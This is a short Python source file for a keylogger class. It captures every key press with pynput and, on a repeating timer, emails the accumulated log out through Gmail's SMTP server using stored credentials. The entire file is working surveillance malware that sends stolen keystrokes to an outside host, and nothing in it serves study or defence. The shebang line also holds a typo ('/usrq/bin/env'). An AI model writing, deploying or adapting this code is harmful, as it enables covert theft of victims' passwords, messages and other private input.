#!/usrq/bin/env python3
import pynput
import threading
import smtplib


class KeyLogger:
    def __init__(self, interval, email, password):
        self.interval = interval
        self.email = email
        self.password = password
        self.log = "=====  key logger started  =====\n" + "====  interval: " + str(self.interval) + "  ===="

    def process_key_press(self, key):
        try:
            self.log += str(key.char)
        except AttributeError:
            if key == key.space:
                self.log += " "
            elif key == key.enter:
                self.log += "\n"
            elif key == key.tab:
                self.log += "\t"
            elif key != key.shift:
                self.log += " " + str(key) + " "
    
    def report(self):
        self.send_email("\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

    def send_email(self, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(self.email, self.password)
        server.sendmail(self.email, self.email, message)
        server.quit()
